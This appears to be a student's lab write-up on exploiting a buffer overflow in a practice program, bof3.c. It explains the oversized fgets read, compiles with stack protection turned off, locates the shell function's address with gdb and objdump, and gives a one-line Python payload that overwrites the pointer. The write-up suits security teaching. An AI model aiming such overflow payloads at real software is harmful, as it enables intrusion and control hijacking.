# Understand bof3.c 
In this case, we see that the function is treated like a variable, so we only need to change the memory address of the variable to transfer control.
## Stackframe

## Vulnerability
The function fgets(buf, 133, stdin) receives a maximum of 133 bytes, but buf only has 128 bytes, resulting in 5 extra bytes and causing a buffer overflow.
# Start attacking bof3.c 
## Compiling the file without stack restriction
`gcc -g bof3.c -o bof3.out -fno-stack-protector -mpreferred-stack-boundary=2`  
## In order to attack the file, we need to know the address of the shell we are using
- Use gdb to find the address of the shell function: 0x0804845b  
`gdb bof3.out`  

`disas shell`  

- Or we use at outer by using `objdump -d bof3.out | grep shell`  

## To calculate how many bytes to inject to replace a function's return address with the shell function address, we need to determine
`  echo $(python -c "print('a'*128+'\x5b\x84\x04\x08')") | ./bof3.out`  

